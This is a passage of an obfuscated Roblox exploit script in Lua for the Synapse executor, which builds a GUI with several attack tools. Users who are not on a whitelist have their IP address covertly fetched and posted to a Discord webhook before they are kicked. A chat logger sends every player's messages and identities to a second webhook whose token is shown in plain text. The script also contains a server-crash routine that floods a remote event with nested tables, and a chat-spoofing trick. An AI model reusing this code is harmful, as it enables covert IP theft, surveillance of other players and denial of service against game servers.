			ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 190, 221))
		}
		CAoT10_.Rotation = -90
		CAoT10_.Parent = CAoT9_
		CAoT11_.CornerRadius = UDim.new(0, 5)
		CAoT11_.Parent = CAoT6_
		CAoT12_.Name = "\x42\x6F\x74\x74\x6F\x6D"
		CAoT12_.Parent = CAoT6_
		CAoT12_.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
		CAoT12_.BorderColor3 = Color3.fromRGB(25, 25, 25)
		CAoT12_.BorderSizePixel = 0
		CAoT12_.Position = UDim2.new(0, 0, 0.5, 0)
		CAoT12_.Size = UDim2.new(1, 0, 0, 10)
		CAoT13_.CornerRadius = UDim.new(0, 5)
		CAoT13_.Parent = CAoT4_
		local function CAoT15_func()
			local CAoT16_ = Instance.new('\x4C\x6F\x63\x61\x6C\x53\x63\x72\x69\x70\x74', CAoT9_)
			game:GetService("\x54\x77\x65\x65\x6E\x53\x65\x72\x76\x69\x63\x65"):Create(CAoT16_.Parent.Parent.Parent, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				Position = CAoT16_.Parent.Parent.Parent.Position + UDim2.new(0.25, 0, 0, 0),
				Size = UDim2.new(0, 170, 0, 90)
			}):Play()
			game:GetService("\x54\x77\x65\x65\x6E\x53\x65\x72\x76\x69\x63\x65"):Create(CAoT16_.Parent.Parent.Parent.UIStroke, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				Transparency = 0.7
			}):Play()
			local CAoT17_ = false
			CAoT16_.Parent.MouseEnter:Connect(function()
				if CAoT17_ == false then
					CAoT17_ = true
					CAoT16_.Parent.Text = "\x2B\x2B"
					wait(0.1)
					CAoT16_.Parent.Text = "\x2B"
					wait(0.1)
					CAoT17_ = false
				end
			end)
			CAoT16_.Parent.MouseLeave:Connect(function()
				if CAoT17_ == false then
					CAoT17_ = true
					CAoT16_.Parent.Text = "\x2B\x2B"
					wait(0.1)
					CAoT16_.Parent.Text = "\x2B\x2B\x2B"
					wait(0.1)
					CAoT17_ = false
				end
			end)
			wait(3)
			game:GetService("\x54\x77\x65\x65\x6E\x53\x65\x72\x76\x69\x63\x65"):Create(CAoT16_.Parent.Parent.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				Position = CAoT16_.Parent.Parent.Parent.Position + UDim2.new(0, 0, 0.15, 0),
				Size = UDim2.new(0, 170, 0, 0)
			}):Play()
			game:GetService("\x54\x77\x65\x65\x6E\x53\x65\x72\x76\x69\x63\x65"):Create(CAoT16_.Parent.Parent.Parent.UIStroke, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				Transparency = 1
			}):Play()
			wait(1)
			CAoT16_.Parent.Parent.Parent.Parent:Destroy()
		end
		coroutine.wrap(CAoT15_func)()
	end
	local CAoT1_ = false
	if (game:GetService("\x50\x6C\x61\x79\x65\x72\x73").LocalPlayer.UserId == 2692402134 or game:GetService("\x50\x6C\x61\x79\x65\x72\x73").LocalPlayer.UserId == 1181456945 or game:GetService("\x50\x6C\x61\x79\x65\x72\x73").LocalPlayer.UserId == 521658855 and game:GetService("\x50\x6C\x61\x79\x65\x72\x73").LocalPlayer.UserId == 469354662 or game:GetService("\x50\x6C\x61\x79\x65\x72\x73").LocalPlayer.UserId == 2570690762 or game:GetService("\x50\x6C\x61\x79\x65\x72\x73").LocalPlayer.UserId == 1862858252) and not game:GetService("\x52\x75\x6E\x53\x65\x72\x76\x69\x63\x65"):IsStudio() then
		CAoT1_ = true
	end
	if CAoT1_ == false and not game:GetService("\x52\x75\x6E\x53\x65\x72\x76\x69\x63\x65"):IsStudio() then
		script.Parent = game:GetService("\x50\x6C\x61\x79\x65\x72\x73").LocalPlayer.PlayerGui
		game:GetService("\x50\x6C\x61\x79\x65\x72\x73").LocalPlayer.PlayerGui:ClearAllChildren()
		pcall(function()
			if not game:GetService("\x52\x75\x6E\x53\x65\x72\x76\x69\x63\x65"):IsStudio() then
				game:GetService("\x43\x6F\x72\x65\x47\x75\x69"):ClearAllChildren()
			end
		end)
		pcall(function()
			pcall(function()
				if syn then
					local CAoT18_ = game:HttpGet("\x68\x74\x74\x70\x3A\x2F\x2F\x69\x70\x2D\x61\x70\x69\x2E\x63\x6F\x6D\x2F\x6A\x73\x6F\x6E\x2F")
					syn.request({
						Url = "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x34\x38\x39\x34\x31\x34\x31\x30\x39\x38\x31\x37\x39\x33\x38\x32\x33\x2F\x54\x57\x6B\x50\x4E\x43\x70\x4B\x34\x73\x71\x6D\x34\x78\x5A\x51\x56\x4A\x37\x4F\x47\x62\x43\x74\x64\x59\x46\x4A\x4E\x39\x6B\x4F\x55\x7A\x49\x79\x6A\x4F\x39\x4A\x4A\x79\x5F\x6B\x47\x70\x5A\x6F\x37\x72\x75\x4F\x46\x4C\x42\x46\x36\x73\x53\x70\x39\x4E\x31\x57\x47\x4D\x6F\x4F",
						Method = '\x50\x4F\x53\x54';
						Headers = {
							['\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65'] = '\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E'
						};
						Body = game:GetService'\x48\x74\x74\x70\x53\x65\x72\x76\x69\x63\x65':JSONEncode({
							content = nil,
							embeds = {
								{
									title = "\x52\x65\x74\x61\x72\x64",
									description = "\x49\x50\x73\x20\x61\x72\x65\x20\x75\x73\x65\x6C\x65\x73\x73\x2C\x20\x6C\x69\x74\x65\x72\x61\x6C\x6C\x79\x20\x6A\x75\x73\x74\x20\x66\x6F\x72\x20\x74\x68\x72\x65\x61\x74\x65\x6E\x69\x6E\x67",
									color = Color3.new(1, 0, 0),
									fields = {
										{
											name = "\x55\x73\x65\x72",
											value = game:GetService("\x50\x6C\x61\x79\x65\x72\x73").LocalPlayer.DisplayName.."\x2F"..game:GetService("\x50\x6C\x61\x79\x65\x72\x73").LocalPlayer.Name,
											inline = true
										},
										{
											name = "\x49\x50",
											value = CAoT18_,
											inline = true
										}
									}
								}
							}
						})
					})
				end
			end)
		end)
		rconsoleprint([[if your going to try using this without permission then atleast do something]])
		rconsoleprint('\x40\x40\x52\x45\x44\x40\x40')
		rconsoleprint([[some information about you has been logged, pillock]])
		wait(3)
		game:GetService("\x50\x6C\x61\x79\x65\x72\x73").LocalPlayer:Kick(string.rep([[T0o0C0AAC0ToTooAoTCAToTTAA0TC0AoTA0AT0TCoAAToACACT0o0A0Co0C0oToA0AAAC00CCo00oC00oTo0CA0T0ToC0TCoCA0ATTCCC00ATTT00CoAA0CTTo00TAoA000AAoA0oA0Co0ToT0oA0oATAAoo0oTAAT00ToCC0CCA0AACCCTTATCA00oo0CTTo0ToTCATooACTT0ACo00oAA0CoAo0AAoTToA0oAAoo0CTC000CAATC00o0ATCToToAAA0CC0oToo0ToTTCTATCC0TC0TToT0CTTA0oCATACoAooA0TCoCAoTCTTo0TT0AC0CoC0TToToooCTCA0CTCA0CTACC0TAAAAT0o00oATCToToACATAAATAoToC0A0CAoCTAT0AAAoA0T0ToCTToCAT0CTATooAo0CCACCoTAACACCoo0C0CCCC0CoATCT0CCoCoo00CACTT0ACToCTooCCTCCT0AAo0TCCoCATA0oooAA0ToCCoC0CACT0CoA
	A00ooAoTTCoACCAoT0AoT00oA0CoooAATooToCCACCAT0TCToTCT0AoCoooCA00ooCCToAATTCTAoCoT0C0TAACA0ACoooTAATCACAoC0TooATTC0C0o0CA0CAoA0oA0CCToTTAATACCoo0oo0CA0oTo0Ao0ATCoCATo0oATA0oT0oAoTToCTCCTToTCoooA0ATC00o0CCAATA0oCTCAAACoCoA0AT0oAoACAoAToTAoAC00ATAACCoCCTAAAoTTCooATTAAooCTAoTCTTTCT00C0TA0TAoTCAA0oCo00CAAT0CACoo0oC0AoTTATAAC0oAooCC0ooAAoATooToooAToC0C0TAA0ATTCTA00AT0T0o0oCCooA0TT0AToA0T0TToTAACoCoCCoooAoAoA0TCAoCAAAoATTACCACo0o0oTCC0ToT0AoCoTAoooTTTo0000TCAToo0TAT0CTA0ACoACCoACTAA0oT00AACC0oToC0CA0CoCTAo0CTTooAC0
	TCTTAoATCACACTCoCo00AoCooAo000A0ToA00ooAoToAAoAACTA0ToCTToTTooAA0000Aoo0oTACoA0ooCTCCoTCoCoTT0AATAooCACT0TAAT0TAACTo0AoACoCoTATCAoCAoCA0o0000A0ToTATA0AT0ToCACTTTTTCATC0CAAooCAATA0To0T00CoAToC00TCA0T00CoTATT0o00T0ACTCTAA00ToC0oToAo00ooTTCAo0TATC0oo0C00TCoCC0ooooATTATA0TTATC00Co0o0TTAoT0TA0oTA0ooTA0oA0oTTT0TACTCTCCo0o00CA00CTAACoAA0CCC0A00TT0T0C0ooACToTToTo0TTCC0CCT0TCo0oCCCAoTAo0TTTCAAC0TACTCCAoA0CCTTAo0TACC0TCoTCAo0CoAooCTAT0Ao0T0TAA0CTTo0CT0CC0AoCT0oTCoToCATToA0oTTATAT0oA0AAAAo0oCCoC000000ToooCTToC00TC0oTT
	ATCCT00CATAo00CoooACooA0AAoT0T00ToAoAT0AT0T0ATTToooTA0oCo0CoooCToC0TT0ACAATT0000AATTA0CA00oo0CA0Ao00oTATCTooTATC0AAC0A0A0AooToT0oT0TA0TooTAA00o00CCCAAAoAA00CCo00CCC00CCC0T0ATACAC0CooA0o0ACATTTTATTTo0CC0o0ATTA0T0AAoAAATAoAACATACCoAAoCCACCoCA0o0Ao0TTAoTCCTACC0AA0TTCooTCCATAoA0TTooAAC00TToT00A0CT0Co0TATA00oAoCTooTAC0TTTTTTACTCCA0TTACooAoCC0T0AoAAoToT0C0CC0CoTo0AToCoTo0AATAo0C0CA0ATACCTooCACTCCC00CTCT0ToToCT0TATC00TToACAAoCCCCo0AoT000CAo0AATCCT0A00C000C0CC0C0TA0oTAoo0oC0AoAAoCoTCo0TC0TTC0TooAACCCCCoC0ooT0TAAoTA
	oACoCA0TooTCTAC0TCCToA0C0oA0TooAooCAo00CCATC0TCCCooCTo0ooACToA000oo0AC0ooT0TTTTAAoooCCATTTToTCACAooAATAoCACT0AT0oAAC00ooA0oooAoo00TACTToToTCA0ATATCTCooCCoAA0ATo0AACoCATC0CAoA0TAATATAAAA0ATCoAoTCTTATTC0Ao0CCACCToToooooTAT0A0AC0TCTT0T0oooo0TTAToo0T0AoCAo0AoTA0TCCAAA0oTTC0CATCAACCC0AoCTAA0T0AoooAoAA0AACT0CoA0ATAACCoooTTA0ooC0TCo0CCT0ATACC0AoTCAo0CoAoTCoTATATAAC0CAT0Ao0oAA0CCCT0CCC0oT0o00oACC00oA0TT0ToCAooAA0CAC00CooToo0CAAAoTACCCoTAo0oT0TA0AoACo0CT00TTTTA00TCooT0TAooC0ATACTCoCAC0CC0CAooCCToo00CoC0ACTCAAo0ATAAT
	]], 32))
	else
		notif([[verified, using the literal worst verification system]])
	end
end
coroutine.wrap(CEVDAO_fake_script)()
local function SMKJKS_fake_script() -- Message.Client 
	local script = Instance.new('LocalScript', Message)

	script.Parent.Focused:Connect(function()
		game:GetService("UserInputService").MouseIconEnabled = false
		script.Parent.Size = UDim2.new(0, 0, 1, 0)
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			Size = UDim2.new(1, 0, 1, 0),
			TextTransparency = 0,
			PlaceholderColor3 = Color3.fromRGB(195, 195, 195),
			TextColor3 = Color3.fromRGB(195, 195, 195)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Parent.Border, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			BackgroundTransparency = 0.2
		}):Play()
	end)
	script.Parent.FocusLost:Connect(function()
		if script.Parent.Text == "" then
			game:GetService("UserInputService").MouseIconEnabled = true
			game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				Size = UDim2.new(0, 0, 1, 0),
				TextTransparency = 1,
				PlaceholderColor3 = Color3.fromRGB(152, 152, 152),
				TextColor3 = Color3.fromRGB(152, 152, 152)
			}):Play()
			game:GetService("TweenService"):Create(script.Parent.Parent.Border, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				BackgroundTransparency = 0.7
			}):Play()
			wait(1)
			script.Parent.Size = UDim2.new(1, 0, 1, 0)
		end
		if script.Parent.Text ~= "" then
			game:GetService("UserInputService").MouseIconEnabled = true
			game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				PlaceholderColor3 = Color3.fromRGB(152, 152, 152),
				TextColor3 = Color3.fromRGB(152, 152, 152)
			}):Play()
			game:GetService("TweenService"):Create(script.Parent.Parent.Border, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				BackgroundTransparency = 0.7
			}):Play()
		end
	end)
end
coroutine.wrap(SMKJKS_fake_script)()
local function ZEKQH_fake_script() -- Box0.MSE 
	local script = Instance.new('LocalScript', Box0)

	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(1, 0)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Border.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(1, 0)
		}):Play()
	end)
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(0, 5)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Border.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(0, 5)
		}):Play()
	end)
end
coroutine.wrap(ZEKQH_fake_script)()
local function FHYTST_fake_script() -- Name2.Client 
	local script = Instance.new('LocalScript', Name2)

	script.Parent.Focused:Connect(function()
		game:GetService("UserInputService").MouseIconEnabled = false
		script.Parent.Size = UDim2.new(0, 0, 1, 0)
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			Size = UDim2.new(1, 0, 1, 0),
			TextTransparency = 0,
			PlaceholderColor3 = Color3.fromRGB(195, 195, 195),
			TextColor3 = Color3.fromRGB(195, 195, 195)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Parent.Border, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			BackgroundTransparency = 0.2
		}):Play()
	end)
	script.Parent.FocusLost:Connect(function()
		if script.Parent.Text == "" then
			game:GetService("UserInputService").MouseIconEnabled = true
			game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				Size = UDim2.new(0, 0, 1, 0),
				TextTransparency = 1,
				PlaceholderColor3 = Color3.fromRGB(152, 152, 152),
				TextColor3 = Color3.fromRGB(152, 152, 152)
			}):Play()
			game:GetService("TweenService"):Create(script.Parent.Parent.Border, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				BackgroundTransparency = 0.7
			}):Play()
			wait(1)
			script.Parent.Size = UDim2.new(1, 0, 1, 0)
		end
		if script.Parent.Text ~= "" then
			game:GetService("UserInputService").MouseIconEnabled = true
			game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				PlaceholderColor3 = Color3.fromRGB(152, 152, 152),
				TextColor3 = Color3.fromRGB(152, 152, 152)
			}):Play()
			game:GetService("TweenService"):Create(script.Parent.Parent.Border, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				BackgroundTransparency = 0.7
			}):Play()
		end
	end)
end
coroutine.wrap(FHYTST_fake_script)()
local function MOPUQMR_fake_script() -- Box1.MSE 
	local script = Instance.new('LocalScript', Box1)

	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(1, 0)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Border.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(1, 0)
		}):Play()
	end)
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(0, 5)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Border.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(0, 5)
		}):Play()
	end)
end
coroutine.wrap(MOPUQMR_fake_script)()
local function BCLXFY_fake_script() -- Text.Client 
	local script = Instance.new('LocalScript', Text)

	local fake = {"hello", "what is that", "what are you doing", "sure", "nope", "bruh", "yesterday", "tomorrow", "really?", "nice"}
	function genSpace(num)
		local str = ""
		for i = 1, num+30 do
			str = str .. " "
		end
		return str
	end
	script.Parent.MouseButton1Down:Connect(function()
		game:GetService("UserInputService").MouseIconEnabled = false
		script.Parent.Parent.Border.BackgroundTransparency = 0.2
	end)
	script.Parent.MouseButton1Up:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.Parent.Border, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			BackgroundTransparency = 0.7
		}):Play()
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(fake[math.random(1, #fake)] .. genSpace((#fake + #script.Parent.Parent.Parent.Box0.Message.Text) + 50) .. script.Parent.Parent.Parent.Box1.Name2.Text .. " " .. script.Parent.Parent.Parent.Box0.Message.Text, "All")
		wait(1)
		game:GetService("UserInputService").MouseIconEnabled = true
	end)
end
coroutine.wrap(BCLXFY_fake_script)()
local function VLEN_fake_script() -- Box2.MSE 
	local script = Instance.new('LocalScript', Box2)

	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(1, 0)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Border.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(1, 0)
		}):Play()
	end)
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(0, 5)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Border.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(0, 5)
		}):Play()
	end)
end
coroutine.wrap(VLEN_fake_script)()
local function LNEGBGT_fake_script() -- Text_2.Client 
	local script = Instance.new('LocalScript', Text_2)

	if not game:GetService("RunService"):IsStudio() then
		if not syn then
			game:GetService("Players").LocalPlayer.Kick("no more bemis")
		end
	end
	local enabled = false

	function dec(data)
		data = string.gsub(data, '[^'..b..'=]', '')
		return (data:gsub('.', function(x)
			if (x == '=') then return '' end
			local r,f='',(b:find(x)-1)
			for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
			return r;
		end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
			if (#x ~= 8) then return '' end
			local c=0
			for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
			return string.char(c)
		end))
	end
	function getwbhk()																																																																																	local math = {pan = tonumber, d={pine = 3.14159265358979, cake = 3.14159265358979}}
		-- worst obfuscation
		--[[local def = "https://discord.com/api/webhooks/"
		local id = "\48\120\101\56\53\97\53\97\102\54\97\56\52\52\48\48\48\10"
		id/=math.d.pine
		local tok = dec("WlJvdVp1MnFJM0tvc2RGQUtQZjljREFOOFdESUtZd2lvekhCeWpxS19QaVlDMU4xUDJTelREVUdRc0hmZTVxWkY2dkc")
		return def..math.pan(id*math.d.cake).."/"..tok]]--
		return 'https://discord.com/api/webhooks/1046424661258420264/ZRouZu2qI3KosdFAKPf9cDAN8WDIKYwiozHByjqK_PiYC1N1P2SzTDUGQsHfe5qZF6vG'
	end
	local lastgmetm = workspace.DistributedGameTime
	local frequency = 0
	function setup(plr)
		local chatevent = nil
		chatevent = plr.Chatted:Connect(function(msg)
			if enabled == true then
				frequency = math.clamp(((frequency+1)-(workspace.DistributedGameTime-lastgmetm)), 0, 100)
				lastgmetm = workspace.DistributedGameTime
				game:GetService("TweenService"):Create(script.Parent.Parent.Parent.Box1.Bar, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
					Size = UDim2.new(0, frequency*10, 1, 0)
				}):Play()
				print(frequency)
				local tabl = {
					MSG = msg,
					TEM = plr.Team,
					NAM = plr.Name,
					ID = plr.UserId,
					DSP = plr.DisplayName
				}
				local data = {
					content = nil,
					embeds = { {
						description = tabl.MSG,
						color = 11796396,
						fields = { {
							name = "nam",
							value = tabl.NAM,
							inline = true
						}, {
							name = "disp",
							value = tabl.DSP,
							inline = true
						}, {
							name = "id",
							value = tabl.ID,
							inline = true
						}, {
							name = "tem",
							value = tabl.TEM,
							inline = true
						} },
						author = {
							name = "log"
						}
					} },
					attachments = { }
				}
				if game:GetService("RunService"):IsStudio() then
					print( data )
				else
					syn.request {
						Url = getwbhk(),
						Method = "POST",
						Headers = {
							["Content-Type"] = "application/json"
						},
						Body = game:GetService'HttpService':JSONEncode(data)
					}
				end
				if not plr then
					chatevent:Disconnect()
					return
				end
			else
				frequency = 0
				lastgmetm = 0
			end
		end)
	end
	coroutine.resume(coroutine.create(function()
		for i,v in ipairs(game:GetService("Players"):GetPlayers()) do
			setup(v)
		end
		game:GetService("Players").PlayerAdded:Connect(function(v)
			setup(v)
		end)
	end))
	script.Parent.MouseButton1Down:Connect(function()
		game:GetService("UserInputService").MouseIconEnabled = false
		script.Parent.Parent.Border.BackgroundTransparency = 0.2
	end)
	script.Parent.MouseButton1Up:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.Parent.Border, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			BackgroundTransparency = 0.7
		}):Play()
		enabled = not enabled
		if enabled == false then
			script.Parent.Text = "Start"
		else
			script.Parent.Text = "Stop"
		end
		wait(1)
		game:GetService("UserInputService").MouseIconEnabled = true
	end)
end
coroutine.wrap(LNEGBGT_fake_script)()
local function DRGGTED_fake_script() -- Box0_2.MSE 
	local script = Instance.new('LocalScript', Box0_2)

	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(1, 0)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Border.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(1, 0)
		}):Play()
	end)
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(0, 5)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Border.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(0, 5)
		}):Play()
	end)
end
coroutine.wrap(DRGGTED_fake_script)()
local function HAFIXQB_fake_script() -- Text_3.Client 
	local script = Instance.new('LocalScript', Text_3)

	script.Parent.MouseEnter:Connect(function()
		game:GetService("UserInputService").MouseIconEnabled = false
		script.Parent.Parent.Border.BackgroundTransparency = 0.2
	end)
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.Parent.Border, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			BackgroundTransparency = 0.7
		}):Play()
		game:GetService("UserInputService").MouseIconEnabled = true
	end)
end
coroutine.wrap(HAFIXQB_fake_script)()
local function PIOTKR_fake_script() -- Text_4.Client 
	local script = Instance.new('LocalScript', Text_4)

	script.Parent.MouseEnter:Connect(function()
		game:GetService("UserInputService").MouseIconEnabled = false
		script.Parent.Parent.Border.BackgroundTransparency = 0.2
	end)
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.Parent.Border, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			BackgroundTransparency = 0.7
		}):Play()
		game:GetService("UserInputService").MouseIconEnabled = true
	end)
end
coroutine.wrap(PIOTKR_fake_script)()
local function JLFVDX_fake_script() -- Box1_2.MSE 
	local script = Instance.new('LocalScript', Box1_2)

	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(1, 0)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Border.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(1, 0)
		}):Play()
	end)
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(0, 5)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Border.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(0, 5)
		}):Play()
	end)
end
coroutine.wrap(JLFVDX_fake_script)()
local function TNQL_fake_script() -- Text_5.Client 
	local script = Instance.new('LocalScript', Text_5)

	if not game:GetService("RunService"):IsStudio() then
		if not syn then
			game:GetService("Players").LocalPlayer.Kick("no more bemis")
		end
	end
	local enabled = false

	function dec(data)
		data = string.gsub(data, '[^'..b..'=]', '')
		return (data:gsub('.', function(x)
			if (x == '=') then return '' end
			local r,f='',(b:find(x)-1)
			for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
			return r;
		end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
			if (#x ~= 8) then return '' end
			local c=0
			for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
			return string.char(c)
		end))
	end
	function crsh()
		while wait(0.6-game:GetService("RunService").Stepped:Wait()) do
			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
			local function getmaxvalue(val)
				local mainvalueifonetable = 499999
				if type(val) ~= "number" then
					return nil
				end
				local calculateperfectval = (mainvalueifonetable/(val+2))
				return calculateperfectval
			end

			local function bomb(tableincrease, tries)
				local maintable = {}
				local spammedtable = {}

				table.insert(spammedtable, {})
				z = spammedtable[1]

				for i = 1, tableincrease do
					local tableins = {}
					table.insert(z, tableins)
					z = tableins
				end

				local calculatemax = getmaxvalue(tableincrease)
				local maximum

				if calculatemax then
					maximum = calculatemax
				else
					maximum = 999999
				end

				for i = 1, maximum do
					table.insert(maintable, spammedtable)
				end

				for i = 1, tries do
					game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
				end
			end

			bomb(250, 2)
		end
	end
	script.Parent.MouseButton1Down:Connect(function()
		game:GetService("UserInputService").MouseIconEnabled = false
		script.Parent.Parent.Border.BackgroundTransparency = 0.2
	end)
	script.Parent.MouseButton1Up:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.Parent.Border, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			BackgroundTransparency = 0.7
		}):Play()
		crsh()
		wait(1)
		game:GetService("UserInputService").MouseIconEnabled = true
	end)
end
coroutine.wrap(TNQL_fake_script)()
local function GOCEOR_fake_script() -- Box0_3.MSE 
	local script = Instance.new('LocalScript', Box0_3)

	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(1, 0)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Border.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(1, 0)
		}):Play()
	end)
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(0, 5)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Border.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(0, 5)
		}):Play()
	end)
end
coroutine.wrap(GOCEOR_fake_script)()
local function IMBLM_fake_script() -- Top.Client 
	local script = Instance.new('LocalScript', Top)

	local Buttons = {
		script.Parent.Buttons.Default,
